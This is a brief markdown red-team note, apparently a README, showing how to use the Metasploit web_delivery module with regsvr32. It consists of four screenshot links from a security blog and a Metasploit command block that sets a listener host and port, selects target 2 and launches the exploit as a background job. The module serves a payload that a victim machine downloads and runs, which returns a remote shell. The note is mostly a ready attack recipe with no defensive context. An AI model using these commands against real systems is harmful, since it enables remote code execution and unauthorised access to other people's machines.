# Red-Team

<img src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/regsvr32_msf_webdelivery.png" width="600">

<img src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/regsvr32_execute.png" width="600">
<img src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/regsvr32_web_delivery_execute.png" width="600">
<img src="https://blog.conscioushacker.io/wp-content/uploads/2017/11/regsvr32_web_delivery_shell.png" width="600">
```
    use exploit/multi/script/web_delivery
    set LHOST <ip address>
    set LPORT <port>
    set target 2
    exploit -j
```
